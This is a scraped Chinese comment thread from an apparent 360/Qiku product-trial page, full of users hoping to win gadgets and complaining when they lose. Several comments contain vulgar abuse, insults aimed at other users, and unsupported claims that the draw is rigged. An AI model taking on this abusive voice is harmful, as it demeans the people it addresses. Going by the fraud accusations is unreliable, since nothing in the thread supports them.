网速还是很快的，家用或办工用电脑上面安装360WIFI都完美使用，但是在网吧里面就不行了。其实我主要就是想在网吧里用的，安装过程中会让网吧电脑死机，也无法建立无线连接
再不卖，孩子就要买给我带了....
USB3.0+32G才是王道啊
现在的生活越来越智能化了。
第一次有幸参加这样的活动，真希望自己能有好运！~~~~~~~~~~明天就是30号了，好期待啊！~~~~~~~~~~~~~
万分期待了，希望一个惊喜给他们，昨天刚听到说想买手表，这款实在适合不过了。
期待中，可惜没来得及啊，希望花钱买一个吧
想想就感觉幸福感强，360真好，赞一个，也送我一个祝福！
非常实用，还能给孩子多多运动呢
等你等到我心痛啊，360
真心希望幸运来我家！
等等啊，为此，我还专门换了一个苹果手机
相当期待，快啊
盼星星盼月亮希望能有我啊！给孩子六一最好的礼物，相信奇酷不会让我失望的。
哎呀 来晚了 要是还能申请就好了
永远相信美好的事情即将发生
我们玩航模都叫这玩意航拍多轴飞行器，一般对飞行器是2.4G传输，控制理论距离500m左右（当然，DIY的放大器可以延伸到30KM以上，很多无人机就用的放大延伸技术）；续航时间普通是30分钟起，看马达设置和电池储备；
载重根据不同的多轴来衡量，比如这个算小四轴可能就只能带个狗，要是带5D或者更大的设备，这个肯定不行（其实这也就是玩具级别的，只不过用了互联网硬件概念思路去做的一个产品，说白了就是忽悠不懂的土豪）；视频保存问题，设备只是负责拍摄回传，地面会有一个接收器，空中拍摄后同步回传到地面接收器，储存都是在地面设备上；电池充电时间因设备而异，我们普通玩的用大功率充电，就市场而言一块普通电池30-50分钟充满；
11万可以做无人机了，当然是初级的，哈哈，这个玩具再好也不过5K
11万可以做无人机了，当然是初级的，哈哈，这个玩具再好也不过5K
好希望我有   我才去别的地方不会走错
基本定义：土豪玩具；我们好多哥们结婚都用这种小四轴在婚礼现场，危险性小，送个戒指什么的完全没问题。关键是够好玩。哈哈。
为了我家必须抢一个~~~~~~~！！！      给我妈
不过没有飞行基础的建议不要轻易入手，这个很危险，轻则经济损失，重则使人受伤（玩直机的还有当时就被干倒的），大家可以去网上搜索下模友航模事故的资料看看。
粗糙点的几千块就足矣，就电子配件值钱，和狗
这种饥饿营销真受不了，要卖你就卖，不卖就别生产
国内也很成熟
11W的四轴，哈哈
如果能想微信一样实时对讲就好了
太慢了太慢了！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
恳求辛苦的工作人员，给我女儿一个神表吧。
微单是趋势，一直关注
女儿急得不停的问......求求好心的工作人员，别让我女儿失望。
如果我能在渺茫的机会中神圣的被好心的工作人员选上，我希望神表能是粉色的。
我是安卓4.3的啊
已经一周了，怎么还没有消息呢，
我从第一期抽到现在，都没中过一次，应该给我的写报告的机会吧
哪写的11W？那不写的2000多吗？什么眼神
怎么不搞个锁上去。。小孩子不可以轻易摘下来。。这样更好。。。或者脱掉有记录的。。。。。这样更好辣。。好需要一个给自己的女儿啊。。现在学校的老师很变态的。。怕对女儿不理。买一个放心
价格多少啊？
请一定要选上啊！！！  
明天就是见证奇迹的时刻！ 我孩子说，你给我准备了什么礼物？ 我笑而不答，加油！
防水要做好！
天天盼，期待明天能够中标！！！！6.1啦，充满爱的礼物
一定要选上啊，我妹妹一直想要一个手表...
汗，如果放在门口，那不是把蚊子都引过来了？？
女儿儿童节最好的礼物，呵呵~~
期盼！能给女儿一个惊喜！
这么如的产品很期待！
我家宝贝等着呢，哈~~快到我的“碗”里来！
要是孩子把手表拿掉了，那怎么办？
是在学柯南吗？
我超级需要
看上去还可以，电源和网络怎么解决的
这个要是没有无线就是个废物呀
这个可以有
期盼！能给儿子一个惊喜！
看起来有点麻烦
哈哈哈哈哈~
不错哦，可以
神期待，，，，，
有小孩子的家长都对这个有兴趣啊
我也想买一个。
我家新装修的。正好需要。希望能抢到一个。
关爱儿童成长必须啊。。。避免猥琐的怪蜀黍拐骗我可爱的女儿。。。
有人抽烟能不能检测到？？
这个创意很不错,值得入手~希望以后会打理推广~
想必这应该是给宝贝儿子一个最大惊喜的礼物！
嗓子现在越来越不舒服  希望能帮到我和我家人
看起来还不错哦
什么时候还有得买
看起来很好，不知道续航时间长不！
奇酷真是我们的家人，知道我们需要什么，家刚装修完，为了老人和孩子的健康，抢一个！
不知道什么出品？能否卖到？
酷啊................
闪拍提示已保存照片，但是就是找不到保存到哪儿去了。
竞争激烈啊！那也得为了宝宝抢个试试！
真希望我的试用申请能通过
想要。。。。。
就是忽悠聪明人的主，其实仔细想想 怎么贵有什么用吗
期待呀，期待呀
赞！这个网站跟 http://www.knowgive.com 很像啊！
造型可爱哦，私密性完美！
真希望申请可以通过，奶奶一个人带孩子很不放心，每天都担心孩子 
明天就知道最后结果咯！
奇酷的产品都是和生活息息相关的，支持奇酷，希望能够得到空气检测仪，为自己及家人创造健康的环境。
希望加强审核，淘宝都有预售儿童卫士的了
期待明天！！！
期待中…………真希望能选中，选中、选中、选中、…………，孩子多一份安全，家长多一份安心！
期待明天！！！ 能中奖，给孩子用，让他高兴高兴，同时让家人放心
期盼！能给孩子和家人一个惊喜！ 
期待期待，希望能得到一个啊，上周日我们宝宝差点就走丢了，哭~~
为了我家，必须抢一个~~~~~~~！！！上帝。。。
是的！有兴趣可关注我们的官方微信。
是的！有兴趣可关注我们的官方微信。
万分期待了，希望一个惊喜给他们，昨天刚听到说想买手表，这款实在适合不过了。
创意copy国家宝藏
大神啊，给我一个试用的机会吧，买彩票中不了，奇酷试用给我一次惊喜吧！
ping 只ping了20个包，太少了。建议看以这个命令： ping luyou360.cn -n 1000 &gt;&gt; D:\XXX.txt 这样可以ping1000个包并保存了。
良心点 真的 希望你们不要学搞什么饥饿营销
作为一款眼镜来说，首先要具备眼镜的所有功能，第一，作为近视眼的人，镜片度数应当是可调的，纠正视力，第二，如果近视眼的人戴了普通近视镜就无法佩戴太阳镜、墨镜等，所以镜片还可以加入可变色模式，让近视眼的人更方便，然后才是智能眼镜的功能。
不知道辐射大不大
期待能中奖，就再也不用担心找不到宝宝啦
怎么好的东西为什么不多生产一点  抢什么抢啊！！多生产点就行了 还用抢？？
明天就开始抢
&lt;img&gt;
确实很像柯南啊。
是蓝牙····
一定要得到！！！
上帝啊，保佑我吧
奇酷，我这辈子的幸福生活就交给你了
为了新鲜空气，为了远离雾霾*************
非常的向往啊！！赶紧开卖把 
怎么看不到是否通过新闻呢，申请的时候说27日查看申请进展
这个创意太不错了，赞一个！
菩萨保佑，一定要选到，儿子硬要当六一礼物呢。
上次儿子差就走丢了。
是的！换进来选购，更多资讯，尽在EHANG官方微信，微博，敬请关注。
环境太差了，如来保佑。
为了家里的老人和小孩的健康，真心希望能够获取试用的机会，网上看了类似的空气净化检测器还挺贵的。
不要让看好你的消费者像傻子一样去抢，，不要一味的去触碰我们的承受底线。。。用心做良心产品，消费者就会青睐你
30号公布结果，具体时间不明
yes!!!!!!明天23点公布!!!!!!!!!!!!!!yes!
超级想要！！~
USB3.0已经成为主流了，2.0有点过时了，而且8GB真心小了点。
加油努力，希望好运会砸中
隔音应该没多大效果
如果我能在渺茫的机会中神圣的被好心恳求辛苦的工作人员，给我女儿一个神表吧恳求辛苦的工作人员选上，我希望神表能是粉色的女儿急得不停的问......求求好心的工作人员，别让我女儿失望。
名单公布时间：05月30日11时
有了神器，什么都不怕了
不要让看好你的消费者像傻子一样去抢，，不要一味的去触碰我们的承受底线。。。用心做良心产品，消费者就会青睐你 
求试用！！！
顶！！求试用
郁闷，可以得到吗！！！
360，如果发货能要一个绿色的吗？谢谢啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊
评论字数应在5-200字之间
感觉还是奇酷高大上
转让啊，都抢不到
这货？淘宝一大把，谁要我300转让，没有电池。
求被砸~~
给我体验体验吧 家里要起房子了 刚刚好看见这个嘿嘿
得过一代的就不要再考虑了哈，给我们这些迫切需要的点机会哈
不是200个的吗？怎么变成150了哦？
有我么有我么有我么有我么
我是处女座的，一家都有洁癖，最适合用这个呢~！
不知道我中奖了吗
已经有Broadlink RM2的我无论如何应该有优先权吧？可以更全面评测e-Air嘛，是不是？
嘛~已经拥有BroadLink系列产品的人就别凑热闹了，给其他人一些机会啊。要不然怎么让大家知道BroadLink系列产品的好呢~~链接无线网络部分不用测试了，BroadLink系列产品的核心理念就是云操控，所以这部分功能如果有问题也是在工厂就结局/调试了的问题，不是大问题啦~~~常备香蕉水、各种稀料的军模er路过~室内自装通风系统。自认为很需要、同时具有测试条件的喵~路过。
希望我这次能申请成功！
呵呵，这产品挺好的，关爱青少年儿童，我们的责任。
现代人民的基本需求啊
希望我能被选上，谢谢360的工作人员，超级想要！！
看着不错哦，试试看
这个可以有！一定要支持！ 
希望.....会变.....
什么时候才开始发售啊？已经等了很久了，我太需要这个手表了！
太贵了，还是卖19.9吧，买的人肯定很多，要是20元一个，我也会买一个，呵呵，20元要卖的话就联系我，还可以帮贵公司推广一下！ 
互联网能够及时上传检测数据就更完美了
期待我能给我的宝贝女儿带来最好的礼物。父爱如山！
这将是我给她的最好礼物，更将是我的最好欣慰~~
这个可以有。但是价格是硬伤
这个可以无限延伸
隔音不知道如何
耳机的那个洞洞真的是创意无限
这个电源怎么办？把电线连门上么？
怎么离商业用品还要一段时间吧？
这个价格是比较关系心
这个有安卓的就更好了。
这个很想买
这个在天朝是鸡肋了
这个等待天朝的人才人士如何换一个样子出来
这个还是期待国货吧
这个求试用啊。。
凑 使用的没有一个能轮到我的 
期盼这么长时间，终于快有结果了
有没有我的一份！等了大半年！很期待
今天就要抽出来了，很忐忑。。到底是中了呢，还是中了呢。还是中了呢。。。
微单便携好用，是未来趋势
为了孩子，耐心等待中。
这是等待的一天！一切为了孩子！
19.9+8G u盘 =39.9 性价比就那样吧
真心希望能被选上,但真心不希望用到它除了显示时间外其它的作用！
选我吧，我一定回复一个专业的测评！！
能达到描述的80%效率吗?               夜猫子.
为了孩子，等待中。。。 今天结果就要出来了，有点小激动，真心希望被选中。
试用产品，回复一个专业测评必须的！！！选我，给您一个惊喜。
Come on！大奖直接砸我头上吧，我女儿正需要！呵呵 
这玩意比较看重带恒温功能。
我怎么没看到价钱啊？我都不敢预约
我是第一次申请试用，手表的功能吸引了我。我提交的报告写的是儿子特别善良、有爱心的事，真心希望能选中。现在拐卖儿童的事件总发生、有些坏人就是利用了孩子的爱心，所以我不希望孩子因为爱心而受到伤害。期待能选中，送儿子一个惊喜！
建议官方开发车载版，方便驾车人士使用，应该有很好的市场前景。
我也想要啊，可惜万里挑一啊
就是就是! 
我也正为宝宝选个GPS跟踪的东西，我是刚需~
期待呀，心情~~忐忑，希望幸运降临宝宝身上，坛子里的大小朋友们6.1快乐呀。
有卖就好了。难等。
我真的很想申请到这款产品，激动等待中
很好。就是寿命如何？
很快要到六一儿童节了，这个是送给我女儿最好的礼物！
是mifi还是wifi？ 
确实太贵 39还可以接受
真是个好礼物 
赶紧出来吧 等的很着急哦！
来晚了。。。。真想试试这个
感觉挺有意思，想试一试，尤其是整天坐在电脑前的IT组来说。
等的好心急 
感觉好有创意呀，喜欢这种。
期待中！我要！
我不怎么用微博，但我有QQ群；我有学校群和班级群。我已经推出去了！
我不怎么用微博，我有学校QQ群，孩子班级QQ群，我已经通知他们了，相信有很多已申请。
我不怎么用微博，我有学校QQ群，孩子班级QQ群，我已经通知他们了，相信有很多已申请。
我不怎么用微博，我有学校QQ群，孩子班级QQ群，我已经通知他们了，相信有很多已申请。
这个给老公戴上，感觉很邪恶啊
我不怎么用微博，我有学校QQ群，孩子班级QQ群，我已经通知他们了，相信有很多已申请。
最好支持一键虚拟场所，防止老婆查岗
我不怎么用微博，我有学校QQ群，孩子班级QQ群，我已经通知他们了，相信有很多已申请。
今天公布名单了呢，几点呀？不会是晚上11:59吧？
为什么结果还没出来，好期待啊！真心希望产品能向所描述的那样好，自己能被选中。
还有一小时公布名单，期待啊，送我一个吧。希望360能给我好运
期待自己这次能被选中。
非常棒。很喜欢，精致而且使用，给予好评，已经介绍好几个朋友购买啦
天灵灵地灵灵，幸运马上降临！
激动人心的时刻到了、大家都等着看你人品了、哈哈
造型很美啊
是11点公布吗？
人品好不好，就看有没有我。
本人正在看柯南，喜欢这个产品，也是太阳能的吗？
几点公布呀，太心急了，给我来一个吧
申请第二次了，不抱希望，这次再不过下次不再申请了，浪费时间
十万分一，看来没有希望了
希望佛祖保佑啊，我非常需要这个手表，大山的孩子啊
小编手机是水货，皮套是假货
希望360能给我好运
希望能给孩子带去六一儿童节不一样的惊喜
第一次试用也是平生第一次参与也是为孩子六一儿童节选择的第一次试用礼物，希望好运降临，一次成功。
等待中，希望能申请上试用，也当是六一礼物了。如申请没中，也希望能尽快推向市场，期待中。
11点了，坐等结果。360加油！
还没出来结果？等不及了，好像被抽中
为了全面推广此款儿童手表已经做好了试用前的各项准备，相信小盆友们看到后都会让欧巴们为自己选择这款亲的，六一好礼物里，怎么能少了它呢。但愿偶能如此幸运。
来了吗，哈哈
结果出来了，幸运降临了
没中 也希望购买一个 
希望能中，阿门。。。
送给孩子的生日礼物！能拥有么！！期待中！！！
好东西呀，哈哈
若没选中，在6月20日孩子生日前，能购买一个么？期盼中！
相信360这回一定不会让你失望！！加油！！！
相信不会错过
今天要公布了！期待中···
什么时候推出啊？ 
众里寻他千百度，千分之一在奇酷。奇酷试用噢耶。
盼了好久，终于到30号，期待啊
11点~~~~~~~~~~~~~~~~~~~
什么时候开售啊
没有我  555555555555555
骗人的家伙
还有75个 我有中奖的可能吗 
看来我是下午公布的那75个中了。
我没中啊心里不好受啊
上面没有我？？？
什么时候出啊？ 
你妈的全部是内部名单，你去死
没有我呀，没有我呀，55555，真的好想要啊，我想写试用报告~~~
就是那内部名单，我搓
好希望下午公布的名单有我啊。。。小孩玩是天性。总不能为了担心就不让他玩，可是为了生活自己天天都很忙。。如果拥有了360儿童卫士2.奶奶再也不用担心孙子啦！！！
早知道选的是奇酷会员我就不参加了 伤心呀
又没有啊，失望
是不需要同一个局域网的哦~，要不然都不叫远程操控了，你可以联系一下厂家售后工程师看看什么情况
关键是孩子要喜欢带才行，每次都能自觉带上，第二代产品应该从这个角度下功夫，不然总是放在家里就不能发挥作用了！
暂时没有我，不能灰心，下午接着来。
我家的小孩总是乱跑，特别是在游乐园的时候，那时候人特别多乱跑，害我找不着，我好想要这款手表
很喜欢 可惜没有我
多少钱啊？4万5吗？脑残啊！啊……
没中，期待高失望大，今天的心情没了，哎
软件都已经下载好了，但是没有我，唉，几次了都没有，赶紧销售吧，我出钱买吧！
没中！！！
还没用过这东西...期待中.......
这个表多少钱呢？
没得到试用的机会，遗憾啊！！产品啥时候上市啊！！期待 
我也是奇酷会员吗？试用的兄弟姐妹们都是奇酷会员 ！- ！来吧 来吧。。我需要。贴心的产品等于用心的报告！
下午还有名单公布吗，希望有我啊  
跟中彩票一样难
残，看走眼了
不在试用奇酷网的产品了  每一次中奖的
中签很难，真的很难
没有我哦，期待下次。
泰坦核弹也有？
好难啊，小孩好需要啊，给我中签一次吧，一定好好写试用报告。
很有意思的产品。
申请那么多次，就木有中过，一点信息都木有了！
暴走柯南滑板
没有中上，真可惜。
为什么还是没有我，第二次了，失落，赶快发布购买吧
如果我中签了，一定会宣传给身边的每一个人。也会好好珍惜神表。
你应该用wifi专用破解程序来破解，看看是否能破解才行？
头像晒孩的就行？ 这规则！！！！！  小编，这标准也太奇葩了，再说了，晒孩照后患无穷，一点安全意识都没有，还配发安全产品~~·
一看 没中心都凉了哎！
算了，以后都走x宝直接买，不差这几百块。
我无语。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
又选不上。。。
亲  请给我一个好不
哎呀呀，好大的诚意，特别期望足够幸运
希望能中签
哎呀抽不中，只能去淘宝买一个啦
失望持续发酵~~·
没中，郁闷《《《《《《《《《《《《《《《《《《《《《《《《《《《《《
希望总是在失望。郁闷啊..................
唉，每次都选不上
不明白360的标准是什么，这样搞没什么意思！希望你们能快点发布！
真失望，没中。下次喽！
对于积极参加申请试用的启用，可以在公开出售中，享受优先购买及优惠折扣的特权，呵呵 这样可以弥补大家没有中选的失落，对不对？！
没中，失望 
╮(╯▽╰)╭ 没选上 希望下次ok
6连败、可喜可贺。。。。。
唉..就知道会这样.
是家庭的有用助手.大社会上的污染没治理也是没多大作用。主要是国家支持的东西才能有很好的发展，例如近年来高校申请的物联网专业是社会上需要大量的技术人才，能更有效的融入智能城市这个理念。而对这卫士的总体来说，智能上是远远不足的.对某些空气不能净化；体积大小；社会使用性不高；成本高价格就贵；高效低耗能是该卫士最看重的。不久后这仪器就会被淘汰。随着物联网这方面人才的出现，奇酷上很多产品，景气将会大跌。
我想知道类似这样的产品怎么保障专利性
唉..........就知道会这样,我................唉.......................no!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
9站九败哈哈哈哈，膜拜我吧 
下午有希望!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!要抽到我!!!!!!!!!!!!!!!!!360求你了!!!!!!!!!!!!!!!!!!!!!!!!
希望能中奖，算是给女儿儿童节的礼物吧
一直强烈的支持还是一样打了水漂，成了泡影。。。。
下午有希望!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!要抽到我!!!!!!!!!!!!!!!!!360求你了!!!!!!!!!!!!!!!!!!!!!!!! 
失望中。。。
希望女儿能幸运的拥有它，人家就这么一个女儿，整天为她提心吊胆的生活，真的不好受。
希望能有我!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!360给我—个把!求你了!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
奇酷，无奇不有，好有创意性的东西都发明了出来。
强烈赞同，身为上班族的我。
真想要，双GPU达到12G显存，无压力各大游戏开顶级画质常玩，所以一个风扇就够根本不担心发热， 太贵了
好喜欢。。可是还没抽到。。。哎。。。
失望......但不绝望。但愿剩下的75个当中有我，孩子和我都好期待啊。祈祷......
太失望了 无论怎么支持都得不到 算了，安安静静的取消关注吧
什么时候上市啊？实现了未来科技都市现代化
是不是需要跟360服务人员搞一下关系啊？ 但是呢，就算想搞关系也要有......  既然没有，那就听天由命吧
僧多粥少呀………………不过我喜欢。
就冲着公司年会的号码360中大奖一个笔记本电脑，就说明我和360缘分很足的，必须试用有名字哒
哇，快面世吧！
中没中到真的没关系的，希望试用的朋友能真实分享试用效果，还有如果上市请通知下，我一定去买，不管多少钱，我都竭尽所能的购买，因为孩子的安全是无价的，还有就是给360提个建议，这个产品能不能尽量缩小，你想要是孩子被人贩子拐走了的话，第一件事绝对是卸掉这么显而易见的跟踪器，我是说看能不能做得更小更隐蔽一些，能隐藏在宝宝的裤子的松紧带里或者衣服纽扣里，希望能采纳。谢谢。
很好使用，而且携带非常方便！
在哪儿能查到申请成功没有？好期待啊
超级期待，不要太贵呀
不买 打死也不买
亲们状态显示的神马？？我的是未通过，你们呢？
未中~~~~~~期待公开售卖 
上午的75个没我，下午会不会有呢？非常希望体验一下360的东东，也非常看好360一直专注做安全方面的产品的企业态度。
耳机，一个强大的接口，，，，，，，
火大，都没我的，第一期儿童卫士1到现在2都没中过一次
太失望了 无论怎么支持都得不到 算了，安安静静的取消关注
360逗比你今天搞抢购，京东TMD搞系统升级，在最后付款时要手机验证码，我点了一个小时也没有，后来给京东打电话，人家告诉我，今天系统升级，验证码发不了，你们能不能商量好了，在耍我们啊。京东以后再也不去了，伤不起啊。
我才等到这一天,我想要!!!!!!!!!!!!求你了!!!!!!!!!!!!!!360!
便宜点可以接受
抽签是不指望了，还没这么好的运气过！ 还是期待早点稳定性能，商品化后花点票票买一个来得实在。
多少钱？不要太贵
超酷超好用啊，特别是一键拍照功能，我最喜欢！
太失望了27号说公布我等了29号公布我也等了30号公布还没得到这是神马。骗人的再也不相信360了
不知是否真的有厂家说所之好
谁能告诉我咋奇酷已经推出了几款免费试用产品了？
你好，非常渴望能试用！ 瞧好俺吧！
价钱好友爱
没有中，希望下午有好远，期待上市售卖，这个东东还是比较好的，值得买来用。
去个0，我估计都舍不得买。
六一儿童节的礼物，快来吧！
^_^ 中了哦
这个挺不错
次奥，这尼玛是显卡吗？这么贵
cool！！，，，感觉会很棒哟
可以去马赛克？？？？厉害波，，，好像要
颜色、外形、材料，都很棒，，看起来就想来一把
给干儿子的儿童节礼物啊，一定要中啊。
有种钢铁侠的赶脚。。。。。。
好像要哦，，，how   much
~~~~(&gt;_&lt;)~~~~ 失望啊
什么时候公布另外的75个名单啊，好期待有自己呢
wo ye hao qidai a 
极度失望！儿童卫士1和2都申请过！就没中！从此不用360产品！！
早点上市，准备给儿子买一只
这个感觉好厉害的样子，关键什么时候能出
心都碎了，又没申请上。 
没被抽中，但是渴望产品早点商品化，为孩子买一个比较放心！ 对了，建议：可否在手机端设置一个面积范围，比如小区，当孩子离开这个范围，手机端有相应的提示，距离越远，提示越明显，类似倒车雷达的提示！！！
朋友，我想名单上看到你中了，高兴吧，哈哈
朋友我在名单中有看到你中哦，幸运呀，高兴吧
没中，但没关系啦，关键是赶紧推出产品让我可以买啊。
真的没中啊！万分沮丧！唯一能弥补我感情损伤的办法是快点发售！！！！！！！！！！！！
下午什么时候公布啊，好希望中啊，送给儿子的毕业礼物，他一定会非常喜欢的，
最期待的产品，竟然没中，太失望了。
快公布嘛，等的好着急的啊，有我、有我，一定有我．中了，中了,一定中了
1和2的没选中，我的心都要碎了 
买不到啊，看谁先出吧
下午的没我？！
下午的名单公布没啊？
可以用酷币换吗
小编：149个啊，少一个，该留我吧
很失望啊！
啥时候出售，很期待
价格太贵，可以买个大内存的安卓机了，类似功能安卓版的就便宜多了
失望。。。。。。
一群傻逼，这个有10TB云u盘。
................
去你妈的，那么贵都能他妈买一个无线路由器了
牛！！！！！！！！！！！！！！！
神经病一样设计
电机功率太小
好东西，我想要
有创意，牛逼
牛逼的状态
吃的放心，牛逼
脑残的设计
中国真TM落后，国外一大堆
好东西，一举两得
牛逼的设计
应该用LED省电还环保
有没有制热的能力
牛逼好东西
貌似可以直接插数据卡，，不错，表示比华为的便宜多了，赶快出来吧
牛逼好东西，不知道多少钱？？？？？？ 
没安卓手机用的？？？？ 
没有安卓手机用的？？？ 
中国不行，外国人真他妈牛逼
非常好牛逼
养花养草，很方便。
牛逼，中国牛逼
好东西，消遣娱乐还不错
没我的..............................
评测非常仔细和给力啊。
...............................
要说什么才能中啊，真是骗人的，朋友都说骗人的，我还不信，现在证实他们是对的。 喜欢就申请呗，要写什么申请理由？？？
感觉没什么实际的
价格不错，容易上手，喜欢。
吊，两次申请没有通过，无语了，花心思参加，空欢喜一场！
哈哈 高科技
感觉真不错
可以用酷币换吗 
动脑子吗？汽车是移动的，这里空气质量不好你开走就是了；相反这里你净化了，开到另一个空气差的地方不又白搭吗？不像居家，空气差也不可能轻易搬走，只能净化。不知道有几个人会如此“强烈”，所以市场主要还是在家居这一块！
不错的网站，喜欢
十款了吧。现在是第十期。
自动感知家中环境指标，通过与Broadlink系列产品联动控制， 自动优化和改善室内环境。
官方网站：www.broadlink.com.cn
轻声呼唤你的 e-Air它将会用颜色告诉你当前室内的环境状况
真正的智能空气质量检测设备不仅仅是发出各种警告或者向用户手机推送一条建议那么简单。BroadLink认为，智能是应该在房间干燥的时候自动打开加湿器，在PM2.5浓度过高时自动打开空气净化器或者是在家中有人的时候自动打开恒温器。而这些操作都是通过设备自己的“思考”得出的结论。
希望能研发出更好的东西
让所有人感受到智能带给人们的美好
360   一直支持你
奇酷小编送我一个吧 
期待期待期待期待
送一个就好
我想说 我朋友控制板子都出第5个版本了
僧多肉食，期望值不高。
名字没有我呀！
是不是申请状态显示筛选通过，就是有啊 
奇酷小编送我一个也可以吧
好高兴啊   不是骗人的  我是第1次申请就中了  
草泥马，我这么早申请没中。什么时候卖？
太贵了，坑爹。 
恭喜被选中的人，别忘了在试用过程中多提意见建议，不断完善这个产品。我也没被选中。
360太不要脸了   总是欺骗我们 就是没有货 晚一点看就大吃一惊没有货了！！！！！太不要脸了 我们怎么支持他  他这么对我们
申请这么久了居然没中？好失望·····还准备回来给孩子试试呢····· 
无语，忒贵
每次都欺骗我们  说今天12点360那个u盘出售  等到12点 什么都没有 一点都不诚信
请这么久了居然没中？好失望·····还准备回来给孩子试试呢·····  
能使用光纤吗？现在电信都在升级光纤，能跟光纤猫一起用吗？ 
请这么久了居然没中？好失望·····还准备回来给孩子试试呢·····  希望每个人都能适应
申请这么久了居然没中？好失望·····还准备回来给孩子试试呢···
好失望啊，本来想给孩子试试的，我家宝贝净乱跑、我很不放心，可是这款手表光能申请免费的又不能买，唉，真失望
我想要。。。。。。
我同学也叫张志远
哇哦，从没玩过
我.....................55555555555555555555555555555555555555555555我好不容易才申请到的!55555555555555555555555
good！
( ⊙o⊙ )哇cool
没被抽中，wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww
没了无线，这些产品还能继续作为普通的家电产品使用吗？
完全就是一个鸡肋的功能
无语………………
你想多了，不是去马赛克，而是看到同意屏幕里的另一个画面，就像现在市面的的分屏电视（不是从中间分开，而是分层次），需要带不同的眼镜，然后就可以看到不同的画面！
我不会告诉大家这个玩意宜家三个月前就有类似的产品了，功能更强大，也是方的，只不过屏幕没有这个漂亮
在天津展会上见过一次，没扶手的，然后还在路上见过一次，当时傍晚时候坐在车里在等红灯，看到一个人飘过去，吓死我了...不是开玩笑真的很吓人
第三个木板的才100多元，不信请看http://item.taobao.com/item.htm?spm=a230r.1.14.202.6VTl4V&amp;id=19500818285&amp;ns=1&amp;_u=t1objfunaaff#detail
好期待，如果有手机充电功能那更好
说来听一下
求试用啊…………………………跪求啊！学生党再也不怕堵车了…同柯迷！
什么时候正式开卖
洗臭袜子神器~值得拥有
他妈的，老子申请一个360手表没搞成妈的是不是奇酷这个杂毛公司搞猫腻，专门要别人申请，然后就未通过，钱自己赚了，手表给员工了，你他妈绝对是这样，早知就不申请了好老子精神，妈的逼逼，奇酷这个杂毛公司个骗人的杂毛公司，恨不得直接拆了，操你妈，个杂毛公司，一脚踩了你的奇酷品牌！
还支持，支持个屁！杂毛公司不配我们来支持，配讨饭的支持！
如果你感兴趣可以联系我朋友 淘宝直接搜 天池DIY工作室  他是全套的都做
如果你感兴趣可以联系我朋友  淘宝直接搜 天池DIY工作室 他全套都做的
如果你感兴趣可以联系我朋友  TB直接搜 天池DIY工作室 他全套都做的
希望送我一个啊~o(∩_∩)o 
你QQ多少，这个滑板能做吗？
你他妈运气不好别瞎比比，草你祖宗的，有种你别用360 你他妈的要是用就别瞎比比
快点快点快点快点快点
TB是什么
配置太低！！
希望幸运降临
taobao 
两辆电瓶车......酷耶！！！
最新最好的不是离子净化器吗 这款不是离子净化器 感觉信不过 我早就想买一款好的净化器了 到目前为止还没有找到满意的
是不是把家里所有人的电器都搬到电视柜里放着了？居然连电脑的液晶屏幕也跟电视放着一起？无语
看头像，丫是印度来的吧？难怪，难怪。瞎BB个毛线！
你。。。没去竞争联合国秘书长吧？！我草，如果你去竞争了，选肯定是选不上，但是按你这个素质嘛，哈哈。巴西手兽父是你的前车之鉴啊，SX
最好将来开发出类似于微新风的东西，利用预先敷设的小管道，把净化后的空气送到每一个角落，期待中
5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555,孩子哭了
希望送我一个啊 o(∩_∩)o 
用来檫pp用的
柯南。。。。。。。。。
55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555我也没有，侄子老说要
哼，搞来搞去都不中。哭 
喔次奥，3000美元=18741人民币元，这么贵！
360太假了。我叫身边的朋友都申请。没有一个成功的。360搞内部操控的。亲们。别在浪费时间了。免费为360打广告。。。。。。。无语。。。。。。。
好失望啊，本来想给孩子试试的，我家宝贝净乱跑、我很不放心，可是这款手表光能申请免费的又不能买，唉，真失望 ，骗子
今天在京东预定了，还行吧，就是图一个方便。支持。
哇，想到名侦探柯南了
哎😣没有申请到，无语😓
搞什么灰机，那么多人参与，才给那么点，中奖率寄回为0，也不开放购买......
幸运会降临到我头上吗? 妈妈肯定会特别高兴。
坐等3.0\16G以上
真没什么意义，卖也不卖就拿着试用，名额又少之又少！
只有移动这点很不好
联通的什么时候出- -，
都是傻吊    淘宝上同类产品一大把
同类产品TAOBAO上很多的   大家可以去看看
显卡发烧友，拿到了倒可以试试……
压力山大，看了人家写的报告，写的真心好啊！谢谢奇酷，我可以要草莓红吗。哈哈，头一次中啊，期期参加的！睡不着了～
真是悲哀啊！期待快速发售。速度啊！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！等不及了！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
我要转让不
好想拿到一个试试啊。360，保佑我吧，我会支持你们的。
你下跪求，
非常想来一个  但是他的配件太高
白色的很不耐脏，而且插上去之后就很快的发热了
遗憾之至~~~
已发送提交申请，希望能拿到哦，上一期没有拿到，希望这一期一定要申请到哦支持360!
买不到，也抽不到，遗憾啊....
遗憾没有抽中........
预约买的360wifi2标准版，这又来阿狸了......囧..........话说，阿狸这个一买就是2啊？
无聊的抽奖
抢个球啊，360有多好啊，去买极路由
免费给360做了回广告 上当
超想试用一下，看看咋样
祝贺360又出新品 360又一次走出关键一步
